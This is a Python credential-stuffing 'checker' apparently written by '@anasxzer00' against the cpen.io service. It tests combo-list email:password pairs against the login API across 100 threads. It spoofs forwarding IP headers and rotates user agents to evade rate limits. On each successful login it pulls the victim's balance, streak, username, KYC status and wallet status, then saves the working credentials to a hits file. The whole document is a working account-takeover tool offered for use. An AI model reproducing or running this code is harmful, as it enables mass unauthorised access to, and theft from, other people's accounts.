import requests
import threading
import random
import sys

lock = threading.Lock()
anas_hits = 0
anas_fail = 0

def anasxzer00():
    return ".".join(str(random.randint(0, 255)) for _ in range(4))

def anas_usrgnt():
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36",
        "Mozilla/5.0 (Linux; Android 10; Pixel 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Mobile Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0",
        "Mozilla/5.0 (Windows NT 6.1; rv:40.0) Gecko/20100101 Firefox/40.0",
        "Mozilla/5.0 (Windows NT 5.1; rv:40.0) Gecko/20100101 Firefox/40.0"
    ]
    return random.choice(user_agents)

def anasLogin(usr, pwd):
    global anas_hits, anas_fail
    random_ip = anasxzer00()
    user_agent = anas_usrgnt()
    headers = {
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.9,ckb-IQ;q=0.8,ckb;q=0.7',
        'Connection': 'keep-alive',
        'Origin': 'https://app.cpen.io',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'User-Agent': user_agent,
        'content-type': 'application/json; charset=utf-8',
        'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'X-Forwarded-IP': random_ip,
        'X-Real-IP': random_ip,
    }
    json_data = {
        'email': usr,
        'password': pwd,
    }
    try:
        response = requests.post('https://www.cpen.io/api/IdentityUser/Login', headers=headers, json=json_data)
        response_text = response.text
        with lock:
            if "Wrong" in response_text:
                anas_fail += 1
                sys.stdout.write(f"\r\033[92m\033[1m-- Hits: {anas_hits}\033[0m \033[91m\033[1m| Bad: {anas_fail}\033[0m   ")
                sys.stdout.flush()
            elif "access" in response_text:
                anas_hits += 1
                access_token = response_text.split('"accessToken":"')[1].split('"')[0]
                sys.stdout.write(f"\r  [cPEN] \033[92m\033[1m-- Hits: {anas_hits}\033[0m \033[91m\033[1m| Bad: {anas_fail}\033[0m   ")
                sys.stdout.flush()
                Balance_StreakDay(usr, pwd, access_token)
    except requests.RequestException as e:
        print(f"Error with {usr}:{pwd} - {str(e)}")

def Balance_StreakDay(usr, pwd, access_token):
    headers = {
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.9,ckb-IQ;q=0.8,ckb;q=0.7',
        'Authorization': f'Bearer {access_token}',
        'Connection': 'keep-alive',
        'Origin': 'https://app.cpen.io',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
    }
    params = {'supportMultipleTokens': 'true'}
    try:
        response = requests.get('https://www.cpen.io/api/cpenuser/get-live-mining-session-summary', params=params, headers=headers)
        response_json = response.json()
        balance = response_json.get('balance', 'N/A')
        streak = response_json.get('totalStreakDays', 'N/A')
    except requests.RequestException as e:
        print(f"Error fetching balance/streak for {usr} - {str(e)}")
        balance = "N/A"
        streak = "N/A"
    try:
        profile_headers = {
            'accept-encoding': 'gzip',
            'authorization': f'Bearer {access_token}',
            'host': 'www.cpen.io',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36'
        }
        profile_response = requests.get('https://www.cpen.io/api/cpenuser/GetCpenUserProfile', headers=profile_headers)
        profile_json = profile_response.json()
        username = profile_json.get('userName', 'N/A')
        kyced_bool = profile_json.get('kyced', False)
        kyc = "Yes" if kyced_bool else "No"
    except requests.RequestException as e:
        print(f"Error fetching profile for {usr} - {str(e)}")
        username = "N/A"
        kyc = "N/A"
    try:
        wallet_headers = {
            'accept-encoding': 'gzip',
            'authorization': f'Bearer {access_token}',
            'host': 'www.cpen.io',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36'
        }
        wallet_response = requests.get('https://www.cpen.io/api/cpenuser/get-wallet-info', headers=wallet_headers)
        wallet_json = wallet_response.json()
        wallet_address = wallet_json.get('walletAddress')
        wallet_status = "Not Added" if wallet_address is None or wallet_address == "null" else "Added"
    except requests.RequestException as e:
        print(f" Error {usr}")
        wallet_status = "N/A"
        
    sys.stdout.write(f"\r\033[92m\033[1m-- Balance: {balance} | Streak Days: {streak} | Username: {username} | KYC: {kyc} | Wallet Address: {wallet_status}\033[0m   ")
    sys.stdout.flush()
    with open("cPen-Hits.txt", "a") as f:
        f.write(f"{usr}:{pwd} | Balance = {balance} | Streak Day = {streak} | Username = {username} | KYC = {kyc} | Wallet Address = {wallet_status} | By @anasxzer00\n")

def ComboProcc(file_path, max_threads=100):
    with open(file_path, 'r') as file:
        combos = file.readlines()
    threads = []
    for combo in combos:
        usr, pwd = combo.strip().split(":")
        if len(threads) >= max_threads:
            for thread in threads:
                thread.join()
            threads = []
        thread = threading.Thread(target=anasLogin, args=(usr, pwd))
        threads.append(thread)
        thread.start()
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    anas_combo = input(" -- @anasxzer00 | cPen Checker\n\n [!] Put Combo: ")
    print("-" * 60)
    ComboProcc(anas_combo)
